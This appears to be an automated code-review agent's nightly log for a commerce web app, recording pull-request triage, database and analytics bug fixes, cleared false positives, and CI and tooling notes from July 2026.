Reviewed full diff. All 6 correct + touches DISJOINT files from our #465 (no merge conflict). Its fixes: (1) `ui.tsx` Sparkline guard `data.length < 2` → empty svg (single point div-by-(len-1)=0 NaN; empty series pts[-1] throw — reachable via a ROAS series filtered to spend-bearing days shorter than the caller's raw-length gate). (2) `audit-state-diff.ts` add `increase_campaign_budget` case to the budget-diff group. (3) `undo-branches.ts` add `exclude_geo` + `push_creative_draft` to `HAS_UNDO_BRANCH` — VERIFIED correct: `undo.server.ts` DOES have undo branches for both (lines 383, 435) but the set omitted them → a real set↔branch inconsistency (safe direction: under-reports undo capability, would make the pair refuse to act unattended). (4) `shopify-admin.server.ts` destination-repair province/country NAME fallback when Shopify has no ISO codes (matches mapOrder; without it the repair stamps checked_at and permanently loses region). (5) `cron.ingest.tsx` surface the pending/active_integrations driver-query errors (`driverErrors[]`) instead of swallowing — a failed driver list silently starved whole phases. (6) `first-run.creatives.tsx` refuse honestly with 422 `no_storefront` when `getShopStorefrontOrigin()` is "" (was building a relative URL rejected later by Meta's `new URL()` with a misleading error) + wrap `generateImprovements` in try/catch → degrade to manual-copy fallback instead of a hard 500 mid-wizard. Nothing to add → NO comment (frugal-comment discipline, same as #446/#434/#396).

### False positives cleared this run (do NOT re-flag)
- **Shipping destination-repair atomic claim (#460, migration `20260713160000_order_destination_repair.sql`) — CLEAN:** `claim_order_destination_repairs` uses `... for update of si skip locked` in a materialized CTE + `UPDATE ... set destination_repair_attempted_at=now() RETURNING` = genuine atomic claim-and-stamp; 30-min lease + `completed_at is null` filter. `repairOrderDestinationsForIntegration` fences every per-row write on `.is(col,null)`, checked-marker written AFTER the patch; partial-failure replays converge, no double-repair, no 422. `updateIntegrationProgress` fences completion on `.eq("destination_repair_attempted_at", integration.claimedAt)` (claim time not local) → lost/re-leased claim throws not double-completes. Paged order read (`routes.server.ts` `loadOrderRows`) has `.order("created_at_source").order("id")` unique tiebreak. Serverless dataset bundling (ea2918d) FIXED via static `import { cities } from "world-cities-json"` (no runtime fs). `stableDestinationId` = BigInt FNV-1a + `BigInt.asUintN(64,...)` (no 53-bit loss); antimeridian epsilon-guarded. Auth+PII: aggregation to coarse city/region/country server-side, only city-level DTOs reach client.
- **Journey test-order-with-auto-refund (#449) — CLEAN:** probe `channel='test'` exclusion reaches ALL derived readers/writers — `order_fact` (emit.server.ts:112 skip), `refund_fact` (refund.server.ts:352 skip), live "Sales today" (live-analytics.server.ts:113 `.neq("channel","test")`), `buyer_dim` (fixed synthetic buyer, pre-existing idempotent single row). Auto-refund idempotent: `test-refund:${orderId}` key handed to Stripe + gated by `priorExecutionForKey` + ledger `unique(stripe_event_id,kind)`; post-mutation audit throw terminal, retry hits `order_not_refundable`. Probe-refund race (740056e) closed via `journeyAlive.current` client guard + idempotent server sweep. Carrier-count recompute fix (#451) logs code/details/hint, doesn't move the swallow; `recomputeJourney` fail-soft is documented, read path throws loudly.
- **Payouts (#454) — CLEAN:** `PayoutsCard.tsx` renders `available ? money(amountCents) : "—"` (null balance → "—" not "$0", no `Number(null)===0` trap); `money()` guards non-finite; `payoutsCardState` covers all 3 phases, no dropped status enum after redesign. NON-REGRESSION note (pre-existing, out of scope): `money(available.amountCents)` called WITHOUT `available.currency` → a non-USD Stripe balance renders a "$" symbol; identical currency-less call existed pre-redesign (`git show e22c0db`), so NOT a #454 regression — only fix if it recurs as a fresh diff.
- **Contact-us email action (#455) — CLEAN:** `dashboard.api.contact.tsx` calls `requireSameOrigin` + `requireDashboardSession`; sender identity session-derived (`session.shopDomain ?? session.shopId`) never body; `EMAIL_RE` rejects whitespace/comma/semicolon so reply-to can't smuggle recipients/headers; `to`/`from` from env only (not an open relay); 5000/320 length caps; rate-limited 5/15min; mailer errors → 502 not swallowed; `RESEND_API_KEY` server-only. (Shared rate-limiter fails-open on RPC error = documented design, not a bug.)
- **Product-editor diet (#453) — CLEAN:** `Reveal` primitive always renders children (clipped/`inert`/mounted, height:0) → collapsed sections do NOT unmount inputs or drop form values on save; `stockSummary`/`shippingSummary`/`organizeSummary` pure with sensible fallbacks; live stock `reported` gate falls back to `inventoryOnHand ?? 0` only transiently (no mislabel); reduced-motion branch reveals content (`gsap.set height:auto`). No `.server` in client components.

### Gate / environment
- `npm ci` exit 0, Node v22.x (background, reused by fixer). Fixer ralph-looped green (single pass effectively). Final tree (`2e9b416`): setup 0 · typecheck 0 · lint 0 (13 pre-existing warnings in untouched test files, none on touched) · build 0 (verifier: **314** client files clean) · vitest **746 files / 6240 passed / 12 skipped / 0 failed**.
- **CI runner-infra outage STILL present on #465 (NOT a code regression)** — IDENTICAL signature to every night since 2026-07-07: GH-Actions `Node gate` + `Python engine tests` both `failure`, run duration **~3s** (05:23:54→05:23:57, far too short for ci+typecheck+lint+build+test); the **Python** job co-failed on a **TS-ONLY** diff (impossible); `get_check_run` output entirely EMPTY (summary/text/title all `""`). Did NOT re-kick (no code change turns runner-infra green), did NOT comment (already documented in the #465 body). Auto-subscribed to #465 PR activity; the CI-failure + vercel[bot]-Building webhooks are the expected infra noise. Vercel = Building/deploys fine.
- **`gh` CLI STILL absent** — GitHub MCP only. `list_pull_requests` (even `minimal_output:true`) STILL overflows the tool-result cap (~72k chars across 12 open PRs) → saves to a file; parse with python `json.load`, don't Read. `pull_request_read method:get_diff` returns the companion PR diff inline fine (#464 was small).
- Stop-hook `stop-hook-git-check.sh` fired while the background FIXER was mid-edit on the shared checkout (3 files modified, HEAD still at base) — expected; did NOT commit its in-progress files (races its single-commit flow); waited for its completion notification.


## 2026-07-13

### Triage — 9 merges landed (`f8c7768`..`d21b782`, PRs #438–#445); ZERO landed bugs found
Active window after last night's quiet one. New tip `d21b782`. Merged: #438 home-setup-flush (UI/layout), #439 po-create (atomic RPC + migration), #440 analytics-exclude-test-probes (refund/live-analytics), #441 home-gauge-race, #442 login-shopify-signup, #443 new-product-flow-diet, #444 autopilot-ui-polish, #445 autopilot-copy-trim. Note `4378457`/#435 + `f02edd0` fell in the raw range but are OUR OWN prior nightly (2026-07-11) — already triaged, don't re-triage. Reviewed all diffs directly (no fan-out needed; window was tractable). **All CLEAN → Phase 2 had no landed-bug input → no fix branch, no fix PR** (correct per "no bug fixed = no PR"). Fixers NOT dispatched, so `npm ci` skipped this run.

### False positives cleared this run (do NOT re-flag)
- **#439 po-create atomic RPC + migration `20260712010000_po_create_atomic.sql` (CLEAN — deep review):** `security definer set search_path=''`, all refs fully-qualified (`public.`/`pg_catalog.`), every query shop-scoped, grants revoked from public/anon/authenticated (only `service_role`). Idempotency = `pg_advisory_xact_lock` on `shop:po_audit:audit_id` + `select … for update`; replay returns existing PO id (checked BEFORE payload validation, so a completed promote replays even if its location/supplier changed); stranded lineless-draft repair re-points header to the validated payload (po_number preserved). Dup-variant guard (`array_length <> count(distinct variant_id)`). Null-cost semantics correct: `case when count(unit_cost_cents)=0 then null else sum(qty::bigint*cost) end` → all-null=unknown(null), partial-null sums only costed lines. App maps RPC raises via `PO_RPC_ERRORS` **exact-match** on `error.message` (the SQL raises the bare errcode as the whole message) → 422/404; unknown errors rethrown untouched. `po_empty/invalid_po/location_inactive/supplier_not_found/variant_not_found/po_not_draft` all present in the map.
  - **`po_list` orders by `created_at desc` with NO `id` tiebreak — this is PRE-EXISTING, not a regression.** The old `po_list` (`20260710200000_purchase_orders.sql:402`) already ordered the same way; the new migration preserves it. Unlike the paged Supabase reads on the money path, PO `created_at` collisions within a single shop are near-impossible (one PO per user action, not bulk), and it's LIMIT/OFFSET over a `count(*) over()` window, not a `.range()` PostgREST pager. **Do NOT re-flag the missing tiebreak here** — the house paged-read invariant is about `.range()`/`readPaged` on high-volume tables, not this per-shop admin list.
- **#440 analytics-exclude-test-probes (CLEAN):** `.neq("channel","test")` on the today-orders query + the (already-landed #435) `refund_fact`-skip together exclude the 50c go-live probe from BOTH gross AND refund netting — consistent, no half-netting. `channel` is NOT NULL (default 'storefront') so `.neq` drops nothing legit. The new `storefront_event` query is `.gte("created_at", todayStart)`, so `hourOf()` is always ≥0 (the `Math.max(0,…)` clamp is just defensive). `hourly.sales_cents` is intentionally GROSS (refund netting is day-level, no hour to attribute) — documented trend-shape only. **Do NOT re-flag the gross-sparkline vs netted-headline "mismatch"** — it's a deliberate, commented simplification.
- **#442 login-shopify-signup (CLEAN):** the Shopify-button href asymmetry is INTENTIONAL — login mode → `/dashboard/login` (the OAuth-start route `dashboard.login.tsx`), signup mode → `/signup?from=shopify` (the account-creation page `signup.tsx`), different destinations by design. Apex `${apex}/signup?from=shopify` is the author's committed contract (asserted in `app/components/auth/shopify-button-href.test.ts` + `login-shopify-button.test.tsx`, the latter updated by #446). The apex proxy config lives in the out-of-scope `Mezoh/calderyn-waitlist` repo — can't and shouldn't second-guess it. **Do NOT re-flag the bare `/signup` (vs `/dashboard/…`) path.**
- **#441 `home-gauge.ts`, #443 `new-product-copy.ts`, #444 `autopilot-cards.ts` (`sayLine`/`moveGroupFor`/`MOVE_GROUPS`) — pure presentation helpers, correct fallbacks (unknown kind → "other"/null, not booted → 0/pending). Clean.**

### Companion nightly PR #446 (Mezoh, base == our `main` `d21b782`) — GENUINE, 3 real fixes; posted NO comment
Reviewed its full diff (small: Autopilot.tsx, RefundModal.tsx, live-analytics.server.ts, 2 tests, css). All correct; nothing to add → **no comment** (frugal-comment discipline, same call as #434). Its fixes:
1. **Autopilot batch-progress keyed by group** — old `batchLeft: number|null` made EVERY group's "Approve all" button show "Approving… N left" during any batch; now `batch: {key: MoveGroupKey, left}` and the label only renders when `batch?.key === g.key`. **I MISSED this in my #444 triage** (marked the autopilot UI clean). `MoveGroupKey` is already imported on main (`Autopilot.tsx:27`), so it compiles.
2. **RefundModal currency label** — hardcoded "Partial amount (USD)" → `(order.currency || "usd").toUpperCase()`.
3. **`total_sales_today_cents` clamp** — `Math.max(0, gross - todayNativeRefundCents)`: a refund processed today can settle a PRIOR-day order (not in today's gross), pushing the net negative; clamp rather than surface a negative headline. Adjacent to #440's netting, which I called clean — this is a display-sanity refinement, not a #440 defect.
- **LESSON (shared progress counter bleeds onto siblings):** when a batch/loop over grouped UI writes a single `setState(count)` progress value, check it's KEYED to the acting element — a bare count renders on every sibling button that reads the same state. Same family as any "which row is busy" state that isn't scoped to the row. Cheap to miss on a UI-only diff; look for it whenever an "Approve all / Run all" button appears in more than one group.

### Gate / environment
- **`gh` CLI STILL absent** — use GitHub MCP (`mcp__github__*`). `list_pull_requests` with `minimal_output:true` STILL overflows the tool-result cap (~69k chars across 12 PRs) → it saves to a file; parse with python (`json.load`), don't Read (one-line file).
- `get_me` login confirms auth as `keyuchen1735-boop`.
- No `npm ci`/gate run this night (no fixers dispatched — zero landed bugs). CI runner-infra status not re-checked (no fix branch to gate).
- **`#435`/`f02edd0` reappear-in-range trap:** our own prior-nightly commits show up inside `f8c7768..d21b782` because f8c7768 was last night's *triage tip*, not necessarily the parent of everything since. Filter out our own `fix/nightly-*` / merged nightly PRs before triaging — they were handled the night they landed.

## 2026-07-12

### Triage — QUIET window: ZERO new commits on main in 24h; main unchanged at `f8c7768`
Nothing landed since last night. `origin/main` still `f8c7768` (last commit 2026-07-10 21:56); latest merged PR is #433 at 2026-07-11T01:56Z, which is BEFORE the 24h window (~04:40Z) and was already fully triaged by the 2026-07-11 run. So **Phase 2 had no landed-bug input → no fix branch pushed, no fix PR opened** (correctly, per "no bug fixed = no PR"). Fixer subagents NOT dispatched.
- **Stale-remote gotcha (worth remembering):** on container start `origin/main` remote-tracking ref was STALE at `c3ecf8e` (#409, 2026-07-09) while the actual checkout HEAD was detached at `f8c7768` — looked like a 122-commit divergence. It was NOT: `git fetch origin main` snapped `origin/main` back to `f8c7768` (== HEAD, linear, 0 commits either side). **Always `git fetch origin main` before trusting `origin/main` for the 24h window; the fresh-clone remote ref can lag the real tip.**

### Two NEW open PRs reviewed (Phase 3); older nightly PRs skipped as already-handled
- **#437 "Nightly review fixes — 2026-07-12" (author Mezoh, base == our main `f8c7768`) — GENUINE companion, all 5 fixes VERIFIED CORRECT end-to-end** (ran its 2 touched test files on the branch: 61/61 pass). Its fixes, all on the PO/products-deferrals batch: (1) `po/pdf.server.ts` PO line-item pagination (was single page, rows past ~25 overwrote totals/ran off edge; MAX_PO_LINES=100); (2) `po/pdf.server.ts` supplier-notes word-wrap via new `wrapText` (was `fitText` single-line truncation, collapses `\n`→space); (3) `po/purchase-orders.server.ts` `promoteAuditDraft` preserves `null` unit_cost_cents (`rawCost==null?null:Number`) — the SAME `Number(null)===0` TBD-vs-$0 trap #434 fixed on the create path, now closed on the promote path; (4) `validateLines` bounds `unitCostCents` via `MAX_UNIT_COST_CENTS=50_000_000` (int4-overflow 500→clean 422; qty already bounded, `po_list` totals as bigint so no other unbounded int); (5) `use-modal-chrome.ts` autofocus now shares the Tab-trap's filtered focusable lookup (extracted `focusableEls` useCallback). Cross-checked all sibling `Number(...)` money sites on the PO path (`mapLine`/`sumTotalCents`/`listPurchaseOrders.totalCents`) — already null-guarded, so #3/#4 have NO missed siblings. **NO MISSES on the PO surface.** Posted ONE confirming comment (verified 5 correct + adjudicated its 2 deferred items — see below). Precedent: comment when there's material to add (like 2026-07-08 on #391); stay silent when there isn't (2026-07-09, 2026-07-11 on #434).
- **#436 "StoreGen: add Atelier Grid template" (author keyuchen1735-boop, base main; 534+/45-, 12 files) — CLEAN, review returned NONE, no comment.** Removes the old three-vibe placeholder picker in favor of a template catalog; `VIBE_CARDS` fully removed with zero dangling refs; `WelcomeOverlay`→`Store.tsx` still forwards `(vibe, brief)`→`generateStudioStoreStream(brief.trim(),…)` with the right `template.vibe`; `templates.ts` catalog well-formed (unique id `atelier-nine`, preview asset exists, `recommendStoreTemplates` pure/stable-sort/non-empty so `[0]`+random index safe); no `any`; **browser-hygiene CLEAN** on `public/atelier-grid/index.html` (no AI/prototype provenance, no HMR/dev-bridge/wildcard-postMessage/sourceMappingURL). Targeted tests validated by inspection.
- Older open PRs (#435 our own last-night fix, #434 already reviewed, #397/#396/#395/#391/#353/#326/#301/#267) — already handled in prior nights; skipped silently, no re-review.

### #437's two "found but not fixed" — adjudicated (act on if they recur)
- **`supabase/migrations/20260710225348_purchase_order_reliability.sql` `po_receive` replay-after-variant-deletion — REAL** (edge case, no data corruption). The per-line `variant_id is null → raise line_variant_missing` guard runs BEFORE the per-line idempotency replay short-circuit (`select qty … if found then continue`), and there's no top-level replay early-return. So if a receive commits but its projection step fails (the retry path this migration exists for) AND the variant is deleted in the interim (`variant_id` is `ON DELETE SET NULL`), the identical-receipt retry 422s instead of no-op'ing. Stock already moved + incoming recomputes on any later PO mutation, so no corruption; trigger window is tiny. Fix = new `create or replace` migration moving the ledger-key `continue` AHEAD of the `variant_id is null` guard (+ skip null variants when collecting reproject targets). Repo migration tests are text-only (not executed) so a hand-written body can't be runtime-verified in-sandbox — needs proper DB testing; do NOT ship unattended.
- **`app/lib/inventory/engine.server.ts:~82/88` `ensurePrimaryLocation .eq("active", true)` — LIKELY BENIGN / partial-false-positive.** #437 flagged that PO/inventory SQL treat NULL `active` as active (`coalesce(active,true)`) while this filters `active = true`, so a shop whose only location has NULL `active` would spawn a duplicate "Primary". BUT the engine/test schema (`tests/engine/schema/migrations/20260426000002_inventory_and_location.sql:12`, and PO migration `20260710200000:24`) defines `active boolean not null default true`, and NO checked-in migration relaxes it → NULL-active rows shouldn't exist. **Caveat that keeps this from being a flat false-positive: the prod base `create table location_dim` DDL is NOT checked into `supabase/migrations` (only `ALTER`s exist — first seen in `20260629160000_inventory_tables.sql` which alters a pre-existing table), so prod's `active` nullability can't be 100% confirmed from the repo alone.** Commented recommending a quick prod-schema confirm before dropping it. **Lesson: don't publicly call an item a flat false-positive when the load-bearing DDL isn't in-repo — hedge to "likely benign, confirm against prod schema."**

### Gate / environment
- `npm ci` exit 0, Node v22.22.2. Baseline (clean `main`/`f8c7768` on branch `fix/nightly-2026-07-12`): typecheck exit 0 — confirmed BEFORE any work. No fixer ran (no landed bug), so no full gate cycle this night.
- **GitHub MCP quirks (still current):** `add_issue_comment` param is `issue_number` (snake_case) — a camelCase `issueNumber` fails with "missing required parameter". `list_pull_requests` overflows the tool-result token cap even with `minimal_output:true` (~66–69k chars) → it auto-saves to a file; parse with a python `json.load` one-liner extracting number/state/merged_at/updated_at/title/head-ref rather than Read.
- `gh` CLI STILL absent — GitHub MCP only.

## 2026-07-11

### Triage — HUGE 24h window (~117 commits, base `844b3d1`→`f8c7768`); a GENUINE companion nightly PR #434 existed
Biggest window in a while. Landed surface: **purchase-orders subsystem** (#432 — supplier_dim + purchase_order tables, `po_ordered`/`po_receive`/`po_cancel`/`po_list`/`po_update_draft` SQL fns, receipt-id receive, promote-from-audit-draft, PDF; reliability follow-up migration `20260710225348`); **orders returns/RMA + profit + recovery + create/edit/invoice** (#415/#421 — RMA create/receive/cancel executors, per-order profit read model, abandoned-checkout recovery, order-edit line reductions w/ refund+restock); **orders lists/exports/unified-list** (#420 — `orders_list` unified RPC + revoke grant, CSV export); **shipping completion** (#426/#427/#428/#429 — EasyPost label buy in fulfill, local pickup at checkout, best-effort address verification D3); **product SEO + editable handles/redirects** (#430/#431 — `product_handle_redirect` table, rename bookkeeping, storefront 301); stripe-tax-inactive → $0 quote (#424); mobile/UI-density (#422/#425); assistant dock revert+redo (#416/#419). Fanned out **5 read-only bug-hunters** (PO · orders-returns/emit · shipping/tax · SEO/handles · orders-lists/exports/assistant) to find what #434 MISSED. **1 real money-path bug fixed → PR #435** (branch `fix/nightly-2026-07-11`, commit `f02edd0`) — **MERGED to main** shortly after opening (the CI runner-infra red did NOT block the merge). So the recurring test-probe refund leak is finally CLOSED on mainline; next night, `f02edd0` in-window is OUR fix — do not re-flag.

- **Companion nightly PR #434 (author Mezoh, base == our `main` `f8c7768`) was GENUINE — 7 fixes, ALL verified correct end-to-end** (reviewed its full diff): po `validateLines` int4 ceiling (>2_147_483_647 → clean 422 not overflow-500); po `promoteAuditDraft` null/"" cost guard (null=unknown stays null, never $0 on a supplier PDF — `Number(null)===0` trap); `order/list.server` `remainingRefundableByOrder` paged ledger read w/ `.order("id")`; `order/signals` both buyer-history reads paged (+`id` added to ledger select); `order/view-filters` `date_from`/`date_to` gated through `Date.parse` (mirrors list-params, so a saved view can't persist a date the route 422s); `shipping/summary` `buildRateCard(originCountry, handlingDays)` threads merchant handling window; `orders.export` truncation gated on `page.totalCount > offset` (not `offset>=MAX_ROWS`, which false-fired at exactly 10000). Test-builder `.range()`/`.order()` stubs added, no assertion changes. **Posted NO comment on #434** (nothing to add; its one miss went in our #435).

### Bug #1 fixed — go-live test-probe refund understates net native revenue (the SYMMETRIC hole to emit.server.ts:112)
- **`app/lib/actions/refund.server.ts`** `executeRefundAction`. `emit.server.ts:112` skips writing `order_fact`/`order_line_fact` for `channel='test'` probe orders (order_fact has no channel col; the analytics channel-exclusion can't reach an emitted fact). But the REFUND path called `emitNativeRefundFact` UNCONDITIONALLY → a `refund_fact` row (`external_id gid://calderyn/Refund/…`, `order_id=null` because order_fact was suppressed). Both native-refund readers sum it with NO channel/order_id exclusion: `analytics/commerce.server.ts` `readWindowNativeRefundCents` (filters only `external_id like gid://calderyn/%` + processed_at) and `dashboard/live-analytics.server.ts` "Sales today". `net = gross − refunds`, probe gross suppressed → net reduced by the probe refund with no offsetting sale. Window expanded reachability (edit line-reductions + full-refund restock now route through `executeRefundAction`). Fix: `loadOrder` selects `channel`; skip the emit when `order.channel==="test"`, mirroring emit.server.ts. Readers untouched (intended: both gross AND refunds exclude test). Added a focused test.
- **NOTE — this is the SAME bug #391 flagged/fixed on 2026-07-08 (bug #3), but #391 NEVER MERGED** (still an open, unmerged Mezoh PR). So it was live on `main` again. **Lesson: a prior night's fix living only in an unmerged companion PR is NOT on main — re-derive from the live tree, and re-fix if the companion PR is stale.** The `channel='test'` (or any "synthetic"/probe flag) on ONE table never auto-propagates to derived fact tables — audit EVERY writer AND reader keyed off derived facts (order_fact gross AND refund_fact refunds) whenever a probe rides the real checkout→emit→refund path. (Same family as 2026-07-07 bug #4.)

### Found but NOT fixed (surfaced in PR #435 for a maintainer call) — act on if it recurs
- **`app/lib/order/unified-list.server.ts` + `supabase/migrations/20260710090000_orders_list_unified.sql:106` — free-text search of a tag containing `_`/`%`/`\` never matches.** The wrapper escapes the term via `escapeLikeMetacharacters` (correct for the `ref`/`buyer_email` ILIKE branches), but the SQL's third branch is an EXACT equality `lower(p_search)=any(unnest(u.tags))`; `rush_order` → escaped `rush\_order` ≠ literal tag `rush_order`. Reachable from the list search box AND the assistant `search_orders` tool; the dedicated tag-chip filter (`p_tag`, passed unescaped) is unaffected. **Why not auto-fixed:** the fix threads a separate UNESCAPED param into the tag-equality branch → changes the `orders_list` RPC signature, which also carries a companion `orders_list_fn_revoke` grant migration. Redefining a hot grant-guarded list RPC unattended is riskier than the low-severity search miss. Needs a deliberate forward migration (`create or replace` + re-grant) + wrapper change. **Lesson (LIKE-escape leaking into a non-LIKE branch):** when one search term feeds BOTH an ILIKE branch and an exact-equality branch, a single pre-escaped param silently breaks the equality — escape per-branch, not once up front.

### False positives cleared this run (do NOT re-flag)
- **Purchase-orders subsystem (whole cluster CLEAN):** no paged/`.range` reads exist (`po_list` computes all per-PO aggregates in SQL `sum(...)::bigint` + `count(*) over ()`; line reads bounded by `MAX_PO_LINES=100`). The v2 fns (`20260710225348`) are idempotent: `po_receive` serializes on the PO header `FOR UPDATE` + per-`(shop,receipt)` advisory xact lock, keys ledger on `po_receive:<receipt>:<line>`, treats exact resubmission as a no-op and supersets/qty-mismatch as `receipt_conflict`; `po_recompute_incoming` derives incoming from PO lines + transfers (never from audit deltas) so cancel's negative journal can't double-count. Every `Number(cost/qty)` null-guarded; all 3 action routes `requireSameOrigin`+`requireDashboardSession`, shop from session; every Supabase call throws `error`; DTO-shaped. `reset.server.ts` PO wipe (lines→headers→suppliers before location_dim) is FK-safe.
- **Shipping/tax (CLEAN):** pickup taxes origin nexus w/ $0 shipping (computed not skipped); D3 `verifyCheckoutAddress` never throws (awaited after quote, country excluded — can't hard-fail checkout); free-ship threshold on authoritative `subtotalCents`; engine cache key shop-scoped via `rateSource.id` + destination in the request hash; label buy fail-closed/idempotent (`easypost_shipment_id` + `purchased` state). stripe-tax-inactive $0 quote is INTENTIONAL (config gap, not failure). (#434's flagged lower-sev items — easypost cache credential fingerprint, pre-discount free-ship subtotal, flat-rate zone specificity, adapter delivery-days precedence — remain open, maintainer call.)
- **Product SEO / editable handles (CLEAN):** redirect upsert written BEFORE the handle flip (retryable order, no 404 of a previously-live URL); reclaim-delete only removes an `old_handle` that went live again; `resolveHandleRedirect` self-target guard + active-target-handle prevents A→B→A loop chaining (residual stale-browser-cache bounded by `Cache-Control: max-age=300`); shop-scoped both sides; onConflict targets match the uniques; 301 read is `maybeSingle` on the unique key (no clamp); `Location` is a write-validated stored handle, `encodeURIComponent`-wrapped; SEO read path does NO re-validation so no persist-then-422-on-read gap; both write routes `requireSameOrigin`+`requireDashboardSession`, shop from session; `createProduct` rejects `seo` (422).
- **Orders returns/edit/emit/profit (CLEAN beyond the one bug):** returns receive refund/restock + both crash-window resumes are double-refund-safe (nested refund idempotent on `:refund` key + Stripe idempotency key + `record_refund_ledger` unique); edit concurrent-reduction race closed by `order_line_edit_baseline` unique + `concurrent_edit` reject; profit COGS uses `effectiveLineQuantities` (returns don't write `order_line_edit` → correctly DON'T reduce COGS; edits DO); the `financial_status` stamp family is SAFE here — both live consumers use `.in("financial_status",["paid","partially_refunded","refunded"])`, no reader drops the newly-stamped rows; fulfillment retry fails closed (`over_fulfil`/`nothing_to_fulfil`), label recovers via shipment state (no double-buy).
- **Orders lists/exports/assistant (CLEAN beyond the one flagged tag-search):** `full_count` is a window count over the full unified CTE (does NOT mix a clamped native count w/ an uncapped imported count); export pages at 1000 + correct >10000 truncation; assistant order tools take `shopId` from `actionCtx` (session) never model input, validate/refuse imported ids; manual resend-invoice/recovery non-idempotency is intentional merchant re-send (email only, auto sweep at-most-once via `recovery_email_sent_at`); invoice double-pay deferred to webhook already-paid guard (documented). #434's flagged `unified-list` over-scrolled `totalCount=0` remains open.

### Gate / environment
- `npm ci` exit 0, Node v22.22.2. Baseline (clean `main` `f8c7768`): setup 0 · typecheck 0 (confirmed green BEFORE any fix, so a later failure is attributable). Fixer ralph-looped green on iteration 1. Final tree (`f02edd0`): setup 0 · typecheck 0 · lint 0 (13 pre-existing warnings in untouched test files, none on touched) · build 0 (verifier: **305** client files clean) · vitest **717 files / 6042 passed / 12 skipped / 0 failed**.
- **CI runner-infra outage STILL present on #435 (NOT a code regression)** — SAME signature as every night since 2026-07-07: GH-Actions `CI` (`Node gate` + `Python engine tests`) both failed on `f02edd0`; `get_job_logs return_content=true` → **HTTP 404** for BOTH jobs (runner never executed); the Python job co-failed on a TS-ONLY diff (impossible); `get_check_run` output entirely EMPTY (summary/text/title all ""). Did NOT re-kick (no code change turns runner-infra green), did NOT comment (already documented in the #435 body). Vercel preview was Building (deploys fine) — routine bot comment, no action.
- `gh` CLI STILL absent — GitHub MCP only. `list_pull_requests` full body overflows (~55k) → saved to file, parse; `minimal_output:true` for lists.
- **Stop-hook `stop-hook-git-check.sh` fires while a background FIXER is mid-edit on the shared checkout** — expected; do NOT commit the fixer's in-progress files yourself (races its single-commit flow). Wait for the fixer's completion notification.

## 2026-07-09

### Triage — quiet 24h: only PRs #393, #394 landed (+1 docs commit); companion nightly PR #396 existed
Small window since base `db67e73`→`844b3d1` (8 commits, incl. our own #392 merge). New feature work: **#393** (Weather — extract `ForecastMap` @320px, theme maplibre popup/tip behind `.mapcn-popup`/`.mapcn-tooltip`, check in the `weather_suggestion` restore migration `20260707190004`) and **#394** (Campaigns — platform-aware creative empty-state via pure `creativeEmptyText(platform, {loadError, data})` + gate Meta-only header tools behind `platform==="Meta"`). BOTH CLEAN end-to-end. Fanned out 2 read-only review subagents (#396 verify+miss-hunt, #395 storegen bug-hunt) + 1 fixer. **1 real landed bug fixed → PR #397** (draft), branch `fix/nightly-2026-07-09`, commit `320fe6e`.

- **Companion nightly PR #396 (author Mezoh, base == our main `844b3d1`) was GENUINE** — 5 fixes ALL verified correct end-to-end: commerce.server `.order("id")` tiebreak on the 3 native window readers (readWindowOrders/readWindowEvents/readWindowNativeRefundCents — orders/storefront_event/refund_fact all have uuid `id`); store-experiment.server tiebreak on readExposureEvents+readStampedOrders; live-analytics `Math.max(0, gross − todayNativeRefundCents)` floor on ONLY `total_sales_today_cents` (orders_today/funnel/top_products untouched — no derived-field corruption); Campaigns `[c.id]` effect now also `setCreativeData(null)`+`setVariants([])` (real setters; live-guard+refetch keep initial load correct; `variants` is manual-only so safe to clear); affinity `(?:^|[^a-z])`+cue-escaped word-start matcher (kills steel/titanium/escape/training collisions, keeps sandal→sandals, no catastrophic backtracking). Did NOT post a comment on #396 — nothing to add; its one miss was in an unrelated file (fixed in our #397 instead).

### Bug #1 fixed — ship-cost paged reads have NO `ORDER BY` at all (money path)
- **`app/lib/ship-cost/runner.server.ts`** `runShipCostResolution`. All FOUR `fetchAllRows(...)` pagers — `v_order_ship_features` (L118), `order_fact` (L286), `order_line_fact` (L297), `sku_pnl` (L335) — paged `.range(from,to)` with NO `.order()` whatsoever. Postgres LIMIT/OFFSET without ORDER BY is non-deterministic across page requests → any shop >1000 rows skips/dupes rows; period allocation then spreads the period total over a truncated/duplicated order list, inflating/misstating every order read + writing wrong `sku_pnl.ship_cost_cents`/`contribution_margin_cents`. The helper's OWN comment (L88-90) documented the hazard. Fix: `.order("id", { ascending: true })` on all four (each selects a unique `id`; the view exposes `id` too). Same invariant #396 enforces on commerce.server/store-experiment — #396 didn't reach this file. Test-fakes in 3 ship-cost test files needed a real `.order` method added to their in-memory Supabase stub (sorts before `.range` slices, mirroring PostgREST) — no assertions changed.
- **Lesson (this is a STRONGER form of the tiebreak invariant — total ABSENCE of ORDER BY, not merely a non-unique sort):** when auditing the `.order("id")` house invariant, don't only look for `.order(nonUniqueCol)` missing a secondary sort — ALSO grep for paged readers (`.range(`/`readPaged`/`fetchAllRows`) with NO `.order()` at all. ship-cost/runner was the worst case: 4 pagers, zero ordering. The families a companion PR fixes travel FURTHER than the file it touches — sweep sibling money/aggregation modules that page the same way (ship-cost, revenue.server, any `*-cost`/`*-pnl` resolver).

### #395 storegen visual-MVP (OPEN, not merged) — posted a review comment (2 idempotency/paid-spend notes)
- **`dashboard.api.store.images.tsx`** async-imagery fill route. (1) L40-41 `store_asset` guard read is UNBOUNDED (no `.range`/`.order`) → 1000-row clamp drops the `attempted` set on a shop with >1000 store_asset rows → already-imaged products re-enter `pending` → duplicate Higgsfield spend + weakened loop-termination (reachable for any catalog, since `pending` keys off `p.images.length===0`, not just samples). (2) L79-83 hero-failure catch neutralizes the marker AND calls `enhanceListing(shopId, pending[0])` → 2 paid provider calls in one POST, violating the route's stated one-paid-unit-per-request bound. Both flagged as an issue comment. Otherwise #395 is SOLID: both new POST routes have requireSameOrigin+requireDashboardSession + shop-from-session; samples written `status:"active"` (so the active-only generator read includes them — the prior "seed writes draft" concern does NOT apply here); hero HTML double-sanitized; placeholder tile CSS vars are hash-derived numbers (no model/catalog text into a CSS sink); UUID-gated; client fill loop bounded (`for i<12`).

### False positives cleared this run (do NOT re-flag)
